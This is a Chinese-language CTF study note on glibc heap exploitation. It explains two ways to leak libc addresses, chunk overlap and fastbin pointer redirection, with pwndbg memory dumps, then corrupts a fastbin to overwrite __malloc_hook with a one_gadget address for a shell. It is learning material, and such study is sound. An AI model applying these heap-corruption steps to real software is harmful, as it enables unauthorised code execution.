
脑子是不够用了 记下来好了
在CTFwiki 和 丁神的博客看到了两种leak的方法 都很巧妙了

丁神的方法
https://blog.csdn.net/qq_29343201/article/details/66476135
利用堆溢出修改chunk_size，造成chunk overlap，dump的时候就可以把后面一个chunk的fd和bk显示出来了

分配chunk 0（size = 0x60）分配chunk1（0x40）
+---------------+---------------+------------------+
|               |               |                  |
|     chunk 0   |    chunk 1    |      chunk 1     |
|      0x60     |   head(0x10)  |     content 0x40 |
|               |               |                  |
+---------------+---------------+------------------+
pwndbg> x/50gx 0x5566684e9000
0x5566684e9000:	0x0000000000000000	0x0000000000000071
0x5566684e9010:	0x0000000000000000	0x0000000000000000
0x5566684e9020:	0x0000000000000000	0x0000000000000000
0x5566684e9030:	0x0000000000000000	0x0000000000000000
0x5566684e9040:	0x0000000000000000	0x0000000000000000
0x5566684e9050:	0x0000000000000000	0x0000000000000000
0x5566684e9060:	0x0000000000000000	0x0000000000000000
0x5566684e9070:	0x0000000000000000	0x0000000000000051
0x5566684e9080:	0x0000000000000000	0x0000000000000000

从chunk 0改写chunk1的头，改成0x71
再分配一个chunk2 （0x100)

                                    fake chunk 1 （0x70)
                +-----------------------------------------------------------+-
                |                                                           |
                |                                                           |
                |                                                           |
+-------------------------------+------------------+-------------+------------------------+
|               |               |                  |             |          |
|     chunk 0   |    chunk 1    |      chunk 1     |   chunk 2   | content  |   content
|      0x60     |   head(0x10)  |     content 0x40 |  head(0x10) |  (0x10)  |
|               |               |                  |             |          |
+---------------+---------------+------------------+-------------+----------+-------------+
0x56503d5e2000:	0x0000000000000000	0x0000000000000071
0x56503d5e2010:	0x6161616161616161	0x6161616161616161
0x56503d5e2020:	0x6161616161616161	0x6161616161616161
0x56503d5e2030:	0x6161616161616161	0x6161616161616161
0x56503d5e2040:	0x6161616161616161	0x6161616161616161
0x56503d5e2050:	0x6161616161616161	0x6161616161616161
0x56503d5e2060:	0x6161616161616161	0x6161616161616161
0x56503d5e2070:	0x0000000000000000	0x0000000000000071
0x56503d5e2080:	0x0000000000000000	0x0000000000000000
0x56503d5e2090:	0x0000000000000000	0x0000000000000000
0x56503d5e20a0:	0x0000000000000000	0x0000000000000000
0x56503d5e20b0:	0x0000000000000000	0x0000000000000000
0x56503d5e20c0:	0x0000000000000000	0x0000000000000111
0x56503d5e20d0:	0x0000000000000000	0x0000000000000000

这个时候free chunk 1就可以把fake chunk 变成真 chunk了 ，同时我们还能编辑chunk 2 的内容 
或许这就叫做overlap吧
但是在free chunk 1之前 还需要过free对 next size的检查
在chunk 2 的content里伪造一个头部就好了
                                    fake chunk 1 （0x70)
                +-----------------------------------------------------------+-
                |                                                           |
                |                                                           |
                |                                                           |
+-------------------------------+------------------+-------------+------------------------+
|               |               |                  |             |          |
|     chunk 0   |    chunk 1    |      chunk 1     |   chunk 2   | content  |   fake head
|      0x60     |   head(0x10)  |     content 0x40 |  head(0x10) |  (0x10)  |   (0x10)
|               |               |                  |             |          |
+---------------+---------------+------------------+-------------+----------+-------------+

0x563a6f582000:	0x0000000000000000	0x0000000000000071
0x563a6f582010:	0x6161616161616161	0x6161616161616161
0x563a6f582020:	0x6161616161616161	0x6161616161616161
0x563a6f582030:	0x6161616161616161	0x6161616161616161
0x563a6f582040:	0x6161616161616161	0x6161616161616161
0x563a6f582050:	0x6161616161616161	0x6161616161616161
0x563a6f582060:	0x6161616161616161	0x6161616161616161
0x563a6f582070:	0x0000000000000000	0x0000000000000071
0x563a6f582080:	0x0000000000000000	0x0000000000000000
0x563a6f582090:	0x0000000000000000	0x0000000000000000
0x563a6f5820a0:	0x0000000000000000	0x0000000000000000
0x563a6f5820b0:	0x0000000000000000	0x0000000000000000
0x563a6f5820c0:	0x0000000000000000	0x0000000000000111
0x563a6f5820d0:	0x6161616161616161	0x6161616161616161
0x563a6f5820e0:	0x0000000000000000	0x0000000000000071
0x563a6f5820f0:	0x0000000000000000	0x0000000000000000

free chunk 1之后在 allocate 一个 0x60大小的chunk1 
这个时候free chunk2 的话 在chunk 1 的content 里面就会有 chunk2 的fd、bk了 
dump chunk 1 就完成了 leak
但是在这道题中 allocate chunk的话会将 content清空 
所以我们需要修复一下 chunk 2 head 让他恢复到上面👆的样子
并且还需要再分配一个chunk 防止free chunk 2的时候与top chunk合并
之后再 free chunk2 再 dump chunk 1 
这个时候堆的情况：
                                         chunk 1 （0x70)
                +-----------------------------------------------------------+-
                |                                                           |
                |                                                           |
                |                                                           |
+-------------------------------+------------------+-------------+------------------------+
|               |               |                  |             |          |
|     chunk 0   |    chunk 1    |      chunk 1     |   chunk 2   |   libc   |   fake head
|      0x60     |   head(0x10)  |     content 0x40 |  head(0x10) |  fd、bk   |
|               |               |                  |             |          |
+---------------+---------------+------------------+-------+-----+----------+-------------+
                                                           ^
                                                           |
                                                       recovered
0x56008e378000:	0x0000000000000000	0x0000000000000071
0x56008e378010:	0x6161616161616161	0x6161616161616161
0x56008e378020:	0x6161616161616161	0x6161616161616161
0x56008e378030:	0x6161616161616161	0x6161616161616161
0x56008e378040:	0x6161616161616161	0x6161616161616161
0x56008e378050:	0x6161616161616161	0x6161616161616161
0x56008e378060:	0x6161616161616161	0x6161616161616161
0x56008e378070:	0x0000000000000000	0x0000000000000071
0x56008e378080:	0x6161616161616161	0x6161616161616161
0x56008e378090:	0x6161616161616161	0x6161616161616161
0x56008e3780a0:	0x6161616161616161	0x6161616161616161
0x56008e3780b0:	0x6161616161616161	0x6161616161616161
0x56008e3780c0:	0x0000000000000000	0x0000000000000111
0x56008e3780d0:	0x00007f9ac37e5b78	0x00007f9ac37e5b78  <----libc fd、bk
0x56008e3780e0:	0x0000000000000000	0x0000000000000071
0x56008e3780f0:	0x0000000000000000	0x0000000000000000

再来看一下CTF WIKI上给的leak的方法

首先分配四个 0x10的 chunk （fastbin）和一个 0x80的chunk（smallbin）
+---------------+----------------+----------------+------------------+------------------+
|     chunk 0   |    chunk 1     |    chunk 2     |     chunk 3      |      chunk 4     |
|     0x20      |     0x20       |     0x20       |      0x20        |       0x90       |
|（head+content）|                |                |                  |                  |
+---------------+----------------+----------------+------------------+------------------+
先free chunk 2再 free chunk 1 
看一下堆的情况
pwndbg> x/20gx 0x564cfaf1a000
0x564cfaf1a000:	0x0000000000000000	0x0000000000000021
0x564cfaf1a010:	0x0000000000000000	0x0000000000000000
0x564cfaf1a020:	0x0000000000000000	0x0000000000000021
0x564cfaf1a030:	0x0000564cfaf1a040	0x0000000000000000
0x564cfaf1a040:	0x0000000000000000	0x0000000000000021
0x564cfaf1a050:	0x0000000000000000	0x0000000000000000
0x564cfaf1a060:	0x0000000000000000	0x0000000000000021
0x564cfaf1a070:	0x0000000000000000	0x0000000000000000
0x564cfaf1a080:	0x0000000000000000	0x0000000000000091
0x564cfaf1a090:	0x0000000000000000	0x0000000000000000
pwndbg> fastbins 
fastbins
0x20: 0x564cfaf1a020 —▸ 0x564cfaf1a040 ◂— 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0

从chunk 0中利用堆溢出我们去修改一下 chunk 1中的指针让它指向chunk 4
0x55c7eeaeb000:	0x0000000000000000	0x0000000000000021
0x55c7eeaeb010:	0x6161616161616161	0x6161616161616161
0x55c7eeaeb020:	0x0000000000000000	0x0000000000000021
0x55c7eeaeb030:	0x000055c7eeaeb080	0x0000000000000000
0x55c7eeaeb040:	0x0000000000000000	0x0000000000000021
0x55c7eeaeb050:	0x0000000000000000	0x0000000000000000
0x55c7eeaeb060:	0x0000000000000000	0x0000000000000021
0x55c7eeaeb070:	0x0000000000000000	0x0000000000000000
0x55c7eeaeb080:	0x0000000000000000	0x0000000000000091
0x55c7eeaeb090:	0x0000000000000000	0x0000000000000000
pwndbg> fastbins 
fastbins
0x20: 0x55c7eeaeb020 —▸ 0x55c7eeaeb080 ◂— 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0

然后我们在把free的chunk 再分配回去 这样chunk 2就指向chunk 4了 
之后老套路free small bin再dump出fd、bk就好了
但在分配chunk 2 的时候也要先通过 chunk 3把chunk 4的size 改一下 改成和之前一样的（0x21)
这个时候 等于是 chunk 2和chunk 4的指针都同时指向了 chunk 4 
+---------------+----------------+----------------+------------------+-------------------+
|     chunk 0   |    chunk 1     |    chunk 2     |     chunk 3      |     chunk 2(0x21) |
|     0x20      |     0x20       |   (free)       |      0x20        |     chunk 4(0x91) |
|               |                |                |                  |                   |
+---------------+----------------+----------------+------------------+-------------------+
0x55b6f8080000:	0x0000000000000000	0x0000000000000021
0x55b6f8080010:	0x6161616161616161	0x6161616161616161
0x55b6f8080020:	0x0000000000000000	0x0000000000000021
0x55b6f8080030:	0x0000000000000000	0x0000000000000000
0x55b6f8080040:	0x0000000000000000	0x0000000000000021
0x55b6f8080050:	0x0000000000000000	0x0000000000000000
0x55b6f8080060:	0x0000000000000000	0x0000000000000021
0x55b6f8080070:	0x6161616161616161	0x6161616161616161
0x55b6f8080080:	0x0000000000000000	0x0000000000000021
0x55b6f8080090:	0x0000000000000000	0x0000000000000000

这个时候再通过 chunk 3 修复一下chunk 4的size
分配一个chunk5 防止与top chunk合并
free掉chunk4 就拿到fd、bk了
dump chunk2 就leak了
                                                                             chunk 2 pointer
                                                                                   +
                                                                                   |
                                                                                   |
+---------------+----------------+----------------+------------------+---------+---v----+
|     chunk 0   |    chunk 1     |    chunk 2     |     chunk 3      | chunk 4 |  libc  |
|     0x20      |     0x20       |    （free）    |      0x20        | head    |  fd、bk |
|               |                |                |                  | 0x10    |        |
+---------------+----------------+----------------+------------------+---------+--------+
0x560daee17000:	0x0000000000000000	0x0000000000000021
0x560daee17010:	0x6161616161616161	0x6161616161616161
0x560daee17020:	0x0000000000000000	0x0000000000000021
0x560daee17030:	0x0000000000000000	0x0000000000000000
0x560daee17040:	0x0000000000000000	0x0000000000000021
0x560daee17050:	0x0000000000000000	0x0000000000000000
0x560daee17060:	0x0000000000000000	0x0000000000000021
0x560daee17070:	0x6161616161616161	0x6161616161616161
0x560daee17080:	0x0000000000000000	0x0000000000000091
0x560daee17090:	0x00007fc8596d4b78	0x00007fc8596d4b78
0x560daee170a0:	0x0000000000000000	0x0000000000000000


leak 完了之后就是修改 __malloc_hook 为 one_gadget拿shell
这个地方也是学习到了 __malloc_hook 地址不为空的话会首先执行该地址
有专门找one_gadget的工具
https://github.com/david942j/one_gadget/tree/master/

看一下__malloc_hook附近chunk的情况
0x7ff939b7aae0 <_IO_wide_data_0+288>:	0x0000000000000000	0x0000000000000000
0x7ff939b7aaf0 <_IO_wide_data_0+304>:	0x00007ff939b79260	0x0000000000000000
0x7ff939b7ab00 <__memalign_hook>:	0x00007ff93983be20	0x00007ff93983ba00 
0x7ff939b7ab10 <__malloc_hook>:	0x0000000000000000	0x0000000000000000
0x7ff939b7ab20 <main_arena>:	0x0000000000000000	0x0000000000000000
0x7ff939b7ab30 <main_arena+16>:	0x0000000000000000	0x0000000000000000

size = 0x7f 的话content对应的就是0x60
我们想办法把fastbin的指针改到这里
利用0x7f作为size标志位，这个时候分配一个0x60大小的chunk 
只要在后面的空闲块中找不到0x60大小的chunk 就能把chunk分配到__malloc_hook之前了
从我们希望分配chunk的角度去看堆得话 应该是这样的
pwndbg> x/30gx 0x7ff939b7ab20-0x43
0x7ff939b7aadd <_IO_wide_data_0+285>:	0x0000000000000000	0x0000000000000000
0x7ff939b7aaed <_IO_wide_data_0+301>:	0xf939b79260000000	0x000000000000007f
0x7ff939b7aafd:	0xf93983be20000000	0xf93983ba0000007f  <-----size
0x7ff939b7ab0d <__realloc_hook+5>:	0x000000000000007f	0x0000000000000000 <----content
0x7ff939b7ab1d:	0x0000000000000000	0x0000000000000000

随便找一个7f当成chunk size就好了
我们用0x7ff939b7aafd这一行的 7f作为size的话 
size的地址就是0x7ff939b7aafd+0x8=0x7ff939b7ab05
那么content 就是从 0x7ff939b7ab05+0x8 = 0x7ff939b7ab0d开始写起了
而__malloc_hook的地址是0x7ff939b7ab10
0x7ff939b7ab10-0x7ff939b7ab0d=3
所以我们只要先写0x3 * 'a' + one_gadget_addr
就能把one_gadget_addr写到__malloc_hook上去了

然后我们分配一个0x60的chunk4 满足fastbin size
通过chunk 3改写chunk 4的指针到0x7ff939b7aafd
0x5561397bd000:	0x0000000000000000	0x0000000000000021
0x5561397bd010:	0x6161616161616161	0x6161616161616161
0x5561397bd020:	0x0000000000000000	0x0000000000000021
0x5561397bd030:	0x0000000000000000	0x0000000000000000
0x5561397bd040:	0x0000000000000000	0x0000000000000021
0x5561397bd050:	0x0000000000000000	0x0000000000000000
0x5561397bd060:	0x0000000000000000	0x0000000000000021
0x5561397bd070:	0x6161616161616161	0x6161616161616161
0x5561397bd080:	0x0000000000000000	0x0000000000000071
0x5561397bd090:	0x00007ff939b7aafd	0x0000000000000000

这样就能把chunk分配到__malloc_hook前面了 
fill 0x3 * 'a' + one_gadget_addr
调用一下allocate就大功告成了







